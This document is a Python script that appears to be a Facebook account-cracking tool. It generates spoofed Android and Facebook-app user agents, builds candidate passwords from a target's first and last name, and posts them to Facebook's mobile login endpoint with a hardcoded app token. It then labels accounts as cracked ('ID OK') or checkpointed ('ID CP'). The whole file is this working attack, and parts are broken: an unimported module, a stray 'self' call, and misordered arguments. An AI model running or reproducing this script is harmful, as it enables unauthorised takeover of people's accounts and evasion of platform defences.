import requests,random, string,uuid,json,os
os.system("clear")
#Constant Data
models=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()
networks = ["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"]
S = '\033[1;37m'
#Functions
def randomChoices(input_list, n):

    random_items = random.sample(input_list, n)

    result_string = ''.join(random_items) # You can change the delimiter as needed
    return result_string

def randBuildLSB():
    vchrome = str(random.randint(100,425))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/160.1.80.24.874;FBBV/4214829694;FBDM/{density=2.5,width=780,height=1920};FBLC/ca_MY;FBRV/4214899694;FBCR/1030;FBMF/Oppo;FBBD/Itel;FBPN/com.facebook.katana;FBDV/Ostin Realme 5;FBSV/7;FBOP/5;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randFBAN():
  VAPP = random.randint(400000000,499999999)
  ua="[FBAN/FB4A;FBAV/1727.3.0.74.284;FBBV/"+str(VAPP)+";FBDM/{density=2.1,width=780,height=1920};FBLC/ko_PT;FBRV/"+str(VAPP)+";FBCR/Docomo;FBMF/Itel LTD;FBBD/Docomo;FBPN/com.facebook.katana;FBDV/"+random.choice(models)+";FBSV/6;FBOP/5;FBCA/arm64-v8a:;]"
  return ua

def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/358923683;FBAV/291.0.0.12.110;FBDV/SM-T885ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def generate_FBAN():

  android_version=random.randint(3,17)

  device=random.choice(models)
  FBAV=f"{random.randint(150,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
  FBBV=random.randint(100000000,999999999)
  FBCR=random.choice(networks)
  
  ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};FBDM/"+"{density=2.5,width=1440,height=780}"+f";FBLC/en_FR;FBRV/0;FBCR/{FBCR};FBMF/Vivo;FBBD/Moto;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_version};FBOP/1;FBCA/x64:arm-v8a;]"
  return ua
  


def generate_device_dalvik():
  android_version=random.randint(3,14)
  device=random.choice(models)
  Build=f"RP1A.{randomChoices(string.digits,6)}.{randomChoices(string.digits,3)}"
  ua=f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/{Build})"
  return ua
  
  
  
#Method 
def methodA(sid, name, psw):
        try:
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    adid=str(uuid.uuid4())
                    did=str(uuid.uuid4())
                    data = {"adid": adid,
"format": "json",
"device_id": did,
"cpl": "true",
"enroll_misauth": "false",
"family_device_id": did,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
"encrypted_msisdn": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "pk_ID",
"client_country_code": "NP",
"try_num":"1",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"flow": "CONTROLLER_INITIALIZATION",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                print(data)
                headers = {'User-Agent':generate_FBAN(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '6420',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                print("Response=\n",q,"\n\n")

                if 'session_key' in q:
                    print('\033[1;3;32mID OK -- Method OK')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  print('\033[3;31mID CP')

                else:
                    continue
            
        #except Exception as err:print(err)
        except requests.exceptions.ConnectionError:
            time.sleep(7)
            self.methodA(sid, name, ps)
            
            
#Enter OK ID|Password 
sid, password ="100094721727489|12345@".split("|")

methodA(sid,password,[password])